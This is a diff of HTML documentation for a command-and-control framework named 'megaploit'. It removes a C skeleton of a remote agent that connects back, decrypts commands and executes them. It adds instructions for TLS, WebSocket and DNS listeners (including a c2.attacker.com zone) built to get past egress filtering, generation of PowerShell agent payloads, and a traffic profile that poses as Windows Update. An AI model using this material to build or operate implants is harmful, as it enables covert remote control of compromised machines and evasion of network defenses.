-</span><span id="__span-35-30"><a id="__codelineno-35-30" name="__codelineno-35-30" href="#__codelineno-35-30"></a>    ciphertext+tag:     [12 + 2 + 16 = 30 bytes if payload=&quot;ls&quot;]
-</span><span id="__span-35-31"><a id="__codelineno-35-31" name="__codelineno-35-31" href="#__codelineno-35-31"></a>
-</span><span id="__span-35-32"><a id="__codelineno-35-32" name="__codelineno-35-32" href="#__codelineno-35-32"></a>  Frame:
-</span><span id="__span-35-33"><a id="__codelineno-35-33" name="__codelineno-35-33" href="#__codelineno-35-33"></a>    length (4 bytes BE):  00 00 00 2A           → 42  (12 nonce + 2 ct + 16 tag + 12 = 42)
-</span><span id="__span-35-34"><a id="__codelineno-35-34" name="__codelineno-35-34" href="#__codelineno-35-34"></a>    payload:              [nonce][ciphertext][tag]
-</span><span id="__span-35-35"><a id="__codelineno-35-35" name="__codelineno-35-35" href="#__codelineno-35-35"></a>
-</span><span id="__span-35-36"><a id="__codelineno-35-36" name="__codelineno-35-36" href="#__codelineno-35-36"></a>  Wire:  00 00 00 2A [42 bytes]
-</span><span id="__span-35-37"><a id="__codelineno-35-37" name="__codelineno-35-37" href="#__codelineno-35-37"></a>
-</span><span id="__span-35-38"><a id="__codelineno-35-38" name="__codelineno-35-38" href="#__codelineno-35-38"></a>── PHASE 6: Agent executes, sends response ─────────────────────────────────
-</span><span id="__span-35-39"><a id="__codelineno-35-39" name="__codelineno-35-39" href="#__codelineno-35-39"></a>
-</span><span id="__span-35-40"><a id="__codelineno-35-40" name="__codelineno-35-40" href="#__codelineno-35-40"></a>  Plaintext to encrypt:
-</span><span id="__span-35-41"><a id="__codelineno-35-41" name="__codelineno-35-41" href="#__codelineno-35-41"></a>    seq (8 bytes, BE):  00 00 00 00 00 00 00 01
-</span><span id="__span-35-42"><a id="__codelineno-35-42" name="__codelineno-35-42" href="#__codelineno-35-42"></a>    JSON payload:       &quot;\&quot;total 4\\ndrwxr-xr-x ...\&quot;&quot;
-</span><span id="__span-35-43"><a id="__codelineno-35-43" name="__codelineno-35-43" href="#__codelineno-35-43"></a>
-</span><span id="__span-35-44"><a id="__codelineno-35-44" name="__codelineno-35-44" href="#__codelineno-35-44"></a>  [Same framing as above, larger ciphertext]
-</span><span id="__span-35-45"><a id="__codelineno-35-45" name="__codelineno-35-45" href="#__codelineno-35-45"></a>
-</span><span id="__span-35-46"><a id="__codelineno-35-46" name="__codelineno-35-46" href="#__codelineno-35-46"></a>── PHASE 7: Server decrypts, displays to operator ──────────────────────────
-</span><span id="__span-35-47"><a id="__codelineno-35-47" name="__codelineno-35-47" href="#__codelineno-35-47"></a>
-</span><span id="__span-35-48"><a id="__codelineno-35-48" name="__codelineno-35-48" href="#__codelineno-35-48"></a>  recv_msg() → json.loads(payload) → &quot;total 4\ndrwxr-xr-x ...&quot;
+<h2 id="transport-options">Transport Options<a class="headerlink" href="#transport-options" title="Permanent link">&para;</a></h2>
+<h3 id="standard-tcp-transport">Standard TCP Transport<a class="headerlink" href="#standard-tcp-transport" title="Permanent link">&para;</a></h3>
+<p>Default. All traffic is AES-256-GCM encrypted with HMAC-SHA256 authentication.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>python3<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span>
+</span></code></pre></div>
+<h3 id="tls-transport">TLS Transport<a class="headerlink" href="#tls-transport" title="Permanent link">&para;</a></h3>
+<p>Adds TLS wrapping over the encrypted C2 channel (double encryption):</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>python3<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--tls
+</span></code></pre></div>
+<p>The agent payload is generated with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>megaploit [0] » generate --tls
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a># or
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>megaploit [0] » payload ps1 --tls --out agent.ps1
+</span></code></pre></div>
+<h3 id="websocket-transport-port-80443-evasion">WebSocket Transport (port 80/443 evasion)<a class="headerlink" href="#websocket-transport-port-80443-evasion" title="Permanent link">&para;</a></h3>
+<p>Agents can communicate over port 80 or 443 appearing as normal WebSocket browser traffic.
+Useful when outbound TCP is blocked but HTTP/HTTPS is allowed.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Start an HTTP listener on port 80</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>megaploit<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>»<span class="w"> </span>listener<span class="w"> </span>add<span class="w"> </span><span class="m">80</span><span class="w"> </span>--http
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTTP<span class="w"> </span>listener<span class="w"> </span>added<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="c1"># Or HTTPS on port 443</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>megaploit<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>»<span class="w"> </span>listener<span class="w"> </span>add<span class="w"> </span><span class="m">443</span><span class="w"> </span>--http<span class="w"> </span>--tls
+</span></code></pre></div>
+<p>The agent automatically upgrades the HTTP connection to a WebSocket.</p>
+<h3 id="dns-transport">DNS Transport<a class="headerlink" href="#dns-transport" title="Permanent link">&para;</a></h3>
+<p>For environments where only DNS is allowed outbound:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>megaploit<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="o">]</span><span class="w"> </span>»<span class="w"> </span>listener<span class="w"> </span>add<span class="w"> </span><span class="m">53</span><span class="w"> </span>--dns<span class="w"> </span>--zone<span class="w"> </span>c2.attacker.com
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>DNS<span class="w"> </span>listener<span class="w"> </span>added<span class="w"> </span>on<span class="w"> </span>port<span class="w"> </span><span class="m">53</span><span class="w">  </span><span class="nv">zone</span><span class="o">=</span>c2.attacker.com
+</span></code></pre></div>
+<p>Requires you to control the <code>c2.attacker.com</code> DNS zone.</p>
+<h3 id="multiple-simultaneous-listeners">Multiple Simultaneous Listeners<a class="headerlink" href="#multiple-simultaneous-listeners" title="Permanent link">&para;</a></h3>
+<p>Run different transport types simultaneously:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>megaploit [0] » listener list
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>  ● primary     port=4444  plain
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>  ● extra       port=443   TLS
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>  ● extra       port=80    plain
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>megaploit [0] » listener add 8080 --http --tls
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>megaploit [0] » listener add 443 --tls
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>megaploit [0] » listener rm 8080
 </span></code></pre></div>
 <hr />
-<h2 id="18-implementing-a-compatible-client">18. Implementing a compatible client<a class="headerlink" href="#18-implementing-a-compatible-client" title="Permanent link">&para;</a></h2>
-<p>Any language (C, C++, C#, Rust, Go, Java) can act as an agent. The exact requirements in implementation order:</p>
-<h3 id="step-1-tcp-connect">Step 1 — TCP connect<a class="headerlink" href="#step-1-tcp-connect" title="Permanent link">&para;</a></h3>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connect_to</span><span class="p">(</span><span class="n">LHOST</span><span class="p">,</span><span class="w"> </span><span class="n">PORT</span><span class="p">);</span>
+<h2 id="malleable-c2-profile">Malleable C2 Profile<a class="headerlink" href="#malleable-c2-profile" title="Permanent link">&para;</a></h2>
+<p>Shape your traffic to blend in with legitimate software.
+Full documentation: <a href="../C2_PROFILE/">C2_PROFILE.md</a>.</p>
+<div class="language-yaml highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># profiles/windows_update.yaml</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;WindowsUpdate&quot;</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nt">sleep</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">60</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="nt">jitter_max</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">15</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="nt">uri_paths</span><span class="p">:</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;/windowsupdate/v9/selfupdate/AU/x86/XP/en/au.cab&quot;</span>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;/windowsupdate/v9/selfupdate/AU/x64/7/en/au.cab&quot;</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="nt">request_headers</span><span class="p">:</span>
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="w">  </span><span class="nt">Host</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;update.microsoft.com&quot;</span>
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="w">  </span><span class="nt">User-Agent</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows-Update-Agent/10.0.10011.16384</span><span class="nv"> </span><span class="s">Client-Protocol/1.40&quot;</span>
 </span></code></pre></div>
-<h3 id="step-2-optional-tls">Step 2 — (optional) TLS<a class="headerlink" href="#step-2-optional-tls" title="Permanent link">&para;</a></h3>
-<p>Wrap the socket with TLS 1.2+, AEAD-only ciphers, <code>verify=false</code> (self-signed cert on server).</p>
-<h3 id="step-3-hmac-sha256-auth">Step 3 — HMAC-SHA256 auth<a class="headerlink" href="#step-3-hmac-sha256-auth" title="Permanent link">&para;</a></h3>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="kt">uint8_t</span><span class="w"> </span><span class="n">challenge</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="n">recv_exactly</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">challenge</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>
-</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="kt">uint8_t</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="n">HMAC_SHA256</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">,</span><span class="w"> </span><span class="n">challenge</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span>
-</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
+<hr />
+<h2 id="security-model">Security Model<a class="headerlink" href="#security-model" title="Permanent link">&para;</a></h2>
+<h3 id="whats-encrypted">What's encrypted<a class="headerlink" href="#whats-encrypted" title="Permanent link">&para;</a></h3>
+<p>All C2 traffic (commands, responses, file transfers) is encrypted with:
+- <strong>AES-256-GCM</strong> — authenticated encryption, per-message random IV
+- <strong>Sequence numbers</strong> — prevents replay attacks
+- <strong>HMAC-SHA256</strong> — agent authentication on every connection</p>
+<h3 id="authentication-flow">Authentication flow<a class="headerlink" href="#authentication-flow" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Server sends a random 16-byte challenge</li>
+<li>Agent responds with <code>HMAC-SHA256(secret_key, challenge)</code></li>
+<li>Server verifies with <code>hmac.compare_digest()</code> (constant-time, no timing attacks)</li>
+<li>If verification fails, connection is dropped (rate limit: 5 failures per 60s → 300s ban)</li>
+</ol>
+<h3 id="rate-limiting">Rate limiting<a class="headerlink" href="#rate-limiting" title="Permanent link">&para;</a></h3>
+<p>The listener rate-limits failed authentication attempts:
+- 5 failed attempts from an IP in 60 seconds → that IP is blocked for 300 seconds
+- Prevents brute-force attempts against the C2 listener</p>
+<h3 id="ip-allowlisting">IP allowlisting<a class="headerlink" href="#ip-allowlisting" title="Permanent link">&para;</a></h3>
+<p>Restrict which IPs can connect to the listener:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>python3<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--allow-ip<span class="w"> </span><span class="m">10</span>.0.0.5
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>python3<span class="w"> </span>server.py<span class="w"> </span>-lh<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>--allow-ip<span class="w"> </span><span class="m">10</span>.0.0.5<span class="w"> </span>--allow-ip<span class="w"> </span><span class="m">10</span>.0.0.6
 </span></code></pre></div>
-<h3 id="step-4-protocol-version-handshake">Step 4 — Protocol version handshake<a class="headerlink" href="#step-4-protocol-version-handshake" title="Permanent link">&para;</a></h3>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="kt">uint8_t</span><span class="w"> </span><span class="n">ver</span><span class="p">;</span>
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">recv_exactly</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ver</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ver</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">              </span><span class="c1">// echo back verbatim</span>
-</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="kt">int</span><span class="w"> </span><span class="n">use_v2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ver</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x4D</span><span class="p">);</span><span class="w">    </span><span class="c1">// &#39;M&#39;</span>
-</span></code></pre></div>
-<h3 id="step-5-initialise-sequence-counters">Step 5 — Initialise sequence counters<a class="headerlink" href="#step-5-initialise-sequence-counters" title="Permanent link">&para;</a></h3>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="kt">uint64_t</span><span class="w"> </span><span class="n">send_seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="kt">int64_t</span><span class="w">  </span><span class="n">recv_seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
-</span></code></pre></div>
-<h3 id="step-6-command-loop">Step 6 — Command loop<a class="headerlink" href="#step-6-command-loop" title="Permanent link">&para;</a></h3>
-<div class="language-c highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="w">    </span><span class="c1">// receive</span>
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">hdr</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
-</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="w">    </span><span class="n">recv_exactly</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">hdr</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
-</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">be32</span><span class="p">(</span><span class="n">hdr</span><span class="p">);</span>
-</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">frame</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
-</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="w">    </span><span class="n">recv_exactly</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">frame</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span>
-</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>
-</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="w">    </span><span class="c1">// decrypt (if v2)</span>
-</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">plain</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v2</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">aes_gcm_decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">frame</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">frame</span><span class="p">;</span>
-</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>
-</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a><span class="w">    </span><span class="c1">// check seq (big-endian uint64 at bytes 0–7)</span>
-</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a><span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">be64</span><span class="p">(</span><span class="n">plain</span><span class="p">);</span>
-</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="w">    </span><span class="n">assert</span><span class="p">(</span><span class="n">seq</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">recv_seq</span><span class="p">);</span><span class="w">    </span><span class="c1">// replay guard</span>
-</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a><span class="w">    </span><span class="n">recv_seq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">seq</span><span class="p">;</span>
-</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>
-</span><span id="__span-40-17"><a id="__codelineno-40-17" name="__codelineno-40-17" href="#__codelineno-40-17"></a><span class="w">    </span><span class="c1">// extract JSON string (bytes 8+)</span>
-</span><span id="__span-40-18"><a id="__codelineno-40-18" name="__codelineno-40-18" href="#__codelineno-40-18"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">json_unquote</span><span class="p">(</span><span class="n">plain</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
-</span><span id="__span-40-19"><a id="__codelineno-40-19" name="__codelineno-40-19" href="#__codelineno-40-19"></a>
-</span><span id="__span-40-20"><a id="__codelineno-40-20" name="__codelineno-40-20" href="#__codelineno-40-20"></a><span class="w">    </span><span class="c1">// execute</span>
-</span><span id="__span-40-21"><a id="__codelineno-40-21" name="__codelineno-40-21" href="#__codelineno-40-21"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">handle</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
-</span><span id="__span-40-22"><a id="__codelineno-40-22" name="__codelineno-40-22" href="#__codelineno-40-22"></a>
-</span><span id="__span-40-23"><a id="__codelineno-40-23" name="__codelineno-40-23" href="#__codelineno-40-23"></a><span class="w">    </span><span class="c1">// send response</span>
-</span><span id="__span-40-24"><a id="__codelineno-40-24" name="__codelineno-40-24" href="#__codelineno-40-24"></a><span class="w">    </span><span class="n">send_seq</span><span class="o">++</span><span class="p">;</span>
-</span><span id="__span-40-25"><a id="__codelineno-40-25" name="__codelineno-40-25" href="#__codelineno-40-25"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">out</span><span class="p">[</span><span class="mi">8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">result</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">2</span><span class="p">];</span><span class="w">  </span><span class="c1">// seq + &quot;result&quot;</span>
-</span><span id="__span-40-26"><a id="__codelineno-40-26" name="__codelineno-40-26" href="#__codelineno-40-26"></a><span class="w">    </span><span class="n">put_be64</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">send_seq</span><span class="p">);</span>
-</span><span id="__span-40-27"><a id="__codelineno-40-27" name="__codelineno-40-27" href="#__codelineno-40-27"></a><span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">out</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="n">json_quote</span><span class="p">(</span><span class="n">result</span><span class="p">),</span><span class="w"> </span><span class="p">...);</span>
-</span><span id="__span-40-28"><a id="__codelineno-40-28" name="__codelineno-40-28" href="#__codelineno-40-28"></a>
-</span><span id="__span-40-29"><a id="__codelineno-40-29" name="__codelineno-40-29" href="#__codelineno-40-29"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">wire</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">v2</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">aes_gcm_encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="p">...)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">out</span><span class="p">;</span>
-</span><span id="__span-40-30"><a id="__codelineno-40-30" name="__codelineno-40-30" href="#__codelineno-40-30"></a><span class="w">    </span><span class="kt">uint8_t</span><span class="w"> </span><span class="n">len_hdr</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
-</span><span id="__span-40-31"><a id="__codelineno-40-31" name="__codelineno-40-31" href="#__codelineno-40-31"></a><span class="w">    </span><span class="n">put_be32</span><span class="p">(</span><span class="n">len_hdr</span><span class="p">,</span><span class="w"> </span><span class="n">wire_len</span><span class="p">);</span>
-</span><span id="__span-40-32"><a id="__codelineno-40-32" name="__codelineno-40-32" href="#__codelineno-40-32"></a><span class="w">    </span><span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">len_hdr</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
-</span><span id="__span-40-33"><a id="__codelineno-40-33" name="__codelineno-40-33" href="#__codelineno-40-33"></a><span class="w">    </span><span class="n">send</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">wire</span><span class="p">,</span><span class="w"> </span><span class="n">wire_len</span><span class="p">);</span>
-</span><span id="__span-40-34"><a id="__codelineno-40-34" name="__codelineno-40-34" href="#__codelineno-40-34"></a><span class="p">}</span>
-</span></code></pre></div>
-<h3 id="common-mistakes-that-cause-silent-rejection">Common mistakes that cause silent rejection<a class="headerlink" href="#common-mistakes-that-cause-silent-rejection" title="Permanent link">&para;</a></h3>
-<table>
-<thead>
-<tr>
-<th>Mistake</th>
-<th>Symptom</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Little-endian length or seq</td>
-<td>Frame parsing is completely wrong; server reads garbage lengths</td>
-</tr>
-<tr>
-<td>Sending raw text without seq prefix</td>
-<td><code>_SEQ.unpack(raw[:8])</code> reads 8 bytes of your text as a number</td>
-</tr>
-<tr>
-<td>JSON object/array instead of string</td>
-<td><code>json.loads()</code> returns a dict/list; server treats it as a non-string command</td>
-</tr>
-<tr>
-<td>Reusing a sequence number</td>
-<td><code>check_recv_seq()</code> returns False; message is silently dropped</td>
-</tr>
-<tr>
-<td>Wrong nonce position (after ciphertext)</td>
-<td><code>_decrypt()</code> reads the first 12 bytes as nonce → wrong nonce, decryption fails</td>
-</tr>
-<tr>
-<td>Missing 16-byte GCM tag</td>
-<td><code>AESGCM.decrypt()</code> raises <code>InvalidTag</code>; server raises <code>ConnectionError</code></td>
-</tr>
-<tr>
-<td>Not echoing the version byte</td>
-<td>Server never activates AES-GCM state; all subsequent frames are sent encrypted but received as plaintext</td>
-</tr>
-<tr>
-<td>TLS recv buffer too small</td>
-<td>Short-read during server handshake flight; <code>SSL_read</code> / <code>recv</code> returns partial record, frame parser desyncs</td>
-</tr>
-</tbody>
-</table>
-<h3 id="tls-buffer-sizing-for-a-c-client">TLS buffer sizing for a C client<a class="headerlink" href="#tls-buffer-sizing-for-a-c-client" title="Permanent link">&para;</a></h3>
